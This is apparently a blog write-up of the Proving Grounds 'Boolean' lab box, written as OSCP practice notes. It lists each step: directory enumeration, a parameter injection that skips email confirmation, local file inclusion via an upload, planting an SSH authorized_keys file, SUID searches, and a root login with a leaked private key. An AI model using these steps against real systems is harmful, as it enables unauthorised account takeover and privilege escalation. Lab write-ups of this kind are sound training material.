---
layout: post
title:  "Write Up: Proving Grounds Practice - Boolean"
date:   2024-07-25 13:12:31 -0400
categories: oscp proving-grounds TJNull
---



192.168.169.231
me - 192.168.45.213






http://192.168.169.231/login

dirsearch -u http://192.168.169.231 -r -o dirsearch.txt



- using burp we can add the following to the update email command so that it confirms our address
&user%5Bconfirmed%5D=True

- upload a file and click on it then look at the url bar, there is a local file inclusion exploit

- change directory to the user remi home directory and then move under .ssh. We can generate a key locally and upload the authorized_keys file to remis .ssh dir which will allow us to bypass passwd auth


ssh-keygen
cp /home/kali/.ssh/id_rsa.pub authorized_keys


ssh remi@192.168.169.231 -i id_ed25519


now we are in

- no sudo


getcap -r / 2>/dev/null
- nothing

find / -perm -u=s 2>/dev/null | grep -v '^/proc|^/run|^/sys|^/snap'

/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/umount
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/fusermount
/usr/bin/newgrp
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign


Navigate to the home/remi/.ssh/Keys

Here root SSH key is present. so using that we can log in as root in the same terminal.

ssh -i ~/.ssh/keys/root root@127.0.0.1
